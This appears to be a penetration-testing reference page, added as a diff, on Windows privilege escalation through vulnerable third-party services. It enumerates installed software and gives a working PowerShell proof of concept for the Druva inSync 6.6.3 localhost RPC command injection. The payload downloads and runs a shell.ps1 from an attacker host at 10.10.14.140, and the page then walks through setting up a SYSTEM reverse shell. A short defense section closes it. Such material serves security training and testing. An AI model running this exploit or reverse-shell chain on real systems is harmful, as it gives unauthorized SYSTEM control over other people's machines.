@@ -1,0 +1,106 @@
+---
+title: Vulnerable Services
+description: Escalating through known-vulnerable third-party software rather than misconfiguration - enumerate installed programs and their versions, map locally-listening services, match a version to a public LPE exploit, and run the PoC. Walks the Druva inSync 6.6.3 localhost-RPC command injection as the canonical example of a client application whose SYSTEM service is reachable from an unprivileged shell.
+mitre: [T1203, T1068, T1543.003]
+d3fend: [D3-PA]
+impact: [PrivEsc, SystemCompromise]
+owasp: []
+noise: moderate
+sidebar:
+  order: 12
+  label: Vulnerable services
+---
+import { Aside } from '@astrojs/starlight/components';
+
+## TL;DR
+
+A fully-patched, well-configured Windows box can still be escalated through **third-party software** - installed applications and their services often run as SYSTEM and carry their own vulnerabilities. The workflow: list installed programs with versions, confirm the service is running (often on a localhost port), match the version to a public exploit, run it.
+
+```
+# 1. What's installed, with versions (prefer the registry - see caution below)
+Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select DisplayName, DisplayVersion
+
+# 2. What's listening locally (SYSTEM services often bind 127.0.0.1)
+netstat -ano | findstr LISTENING
+get-process -Id <PID>                 # map a suspicious port's PID back to a product
+
+# 3. Match a version to a known LPE
+searchsploit <product> <version>      # or exploit-db / vendor advisories
+
+# 4. Run the PoC (example: Druva inSync 6.6.3, RPC on 127.0.0.1:6064)
+```
+
+Success indicator: the PoC runs your command in the vulnerable service's context - `whoami` returns `nt authority\system`.
+
+## When this applies
+
+This is the path when the privilege/group checks and the ACL audit come up empty but the host runs non-Microsoft software - very common on real workstations and app servers. Two things make it productive:
+
+- **Client apps ship local SYSTEM services.** Backup agents, VPN clients, EDR, "helper" services - they install a SYSTEM-context service that frequently exposes a control channel on a loopback port, assuming "localhost = trusted."
+- **Users are allowed to install software.** Every unvetted install is new attack surface the organization didn't threat-model.
+
+## Enumerate installed software
+
+The uninstall registry keys are the safe primary source - fast, and read-only:
+
+```
+Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*", `
+                 "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" |
+  select DisplayName, DisplayVersion, Publisher | sort DisplayName
+```
+
+<Aside type="caution">
+Avoid `wmic product get` / `Get-CimInstance Win32_Product` for inventory. Querying `Win32_Product` makes Windows Installer run a **consistency check on every MSI-installed product**, which can silently trigger repairs and *modify the host during enumeration* - exactly what you don't want on a client machine you're assessing. It's also slow and only sees MSI installs. The registry keys above cover more, faster, without touching anything.
+</Aside>
+
+Anything non-standard - a backup client, a VPN, a vendor "service" - is a lead. Note the **exact version**; LPEs are version-pinned.
+
+## Confirm the service and map it
+
+A locally-listening port with no obvious owner is the tell. Map it back to a process and then to a product:
+
+```
+netstat -ano | findstr 6064
+#  TCP  127.0.0.1:6064  0.0.0.0:0  LISTENING  3324
+get-process -Id 3324
+#  ProcessName: inSyncCPHwnet64
+get-service | ? {$_.DisplayName -like 'Druva*'}
+#  Running  inSyncCPHService  Druva inSync Client Service
+```
+
+## Worked example - Druva inSync 6.6.3
+
+The uninstall-key enumeration shows `Druva inSync 6.6.3` installed. That version's client service (SYSTEM) exposes an RPC endpoint on `127.0.0.1:6064` that is vulnerable to command injection ([exploit-db 49211](https://www.exploit-db.com/exploits/49211)) - any local user can reach it and run commands as SYSTEM. The PoC is a short PowerShell snippet that frames an RPC message carrying a command:
+
+```powershell
+$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.140:8080/shell.ps1')"
+$s = New-Object System.Net.Sockets.Socket('InterNetwork','Stream','Tcp')
+$s.Connect("127.0.0.1", 6064)
+$header  = [Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
+$rpcType = [Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
+$command = [Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd")
+$length  = [BitConverter]::GetBytes($command.Length)
+$s.Send($header); $s.Send($rpcType); $s.Send($length); $s.Send($command)
+```
+
+Host `shell.ps1` (e.g. Nishang's `Invoke-PowerShellTcp` with a reverse-shell line appended) on a Python web server, start a listener, and run the PoC on the target (set `Set-ExecutionPolicy Bypass -Scope Process` if needed). The callback returns as `nt authority\system`. Prefer an in-memory reverse shell over `net user /add` - quieter, and it avoids changing state on a client machine.
+
+## General workflow
+
+1. **Inventory** installed software and versions (above).
+2. **Research** each non-standard product: `searchsploit`, Exploit-DB, the vendor's security advisories, GitHub. Look specifically for "local privilege escalation", "RPC", "named pipe", "service".
+3. **Confirm** the vulnerable component is actually present and running (version *and* the listening service/pipe).
+4. **Run the PoC** - but read it first. Public LPE PoCs often add a local admin or drop a file; adapt them to an in-memory payload and understand what they change before firing on a client system.
+
+## Defense
+
+- Enforce least privilege: don't let standard users install software; maintain an application allowlist.
+- Patch third-party software on the same cadence as the OS - LPEs in agents/clients are as serious as OS bugs because the agent runs as SYSTEM.
+- Services that only need local IPC should bind to a named pipe with a tight ACL, not an unauthenticated loopback TCP port.
+- Inventory installed software centrally so a vulnerable version is visible before an attacker finds it.
+
+## Related
+
+- [Initial enumeration](/codex/windows/privesc/initial-enumeration/) - installed-software and patch enumeration that feeds this
+- [Situational awareness](/codex/windows/privesc/situational-awareness/) - spotting locally-bound services worth probing
+- [Weak service & registry permissions](/codex/windows/privesc/weak-permissions/) - escalation through misconfiguration rather than a code vulnerability
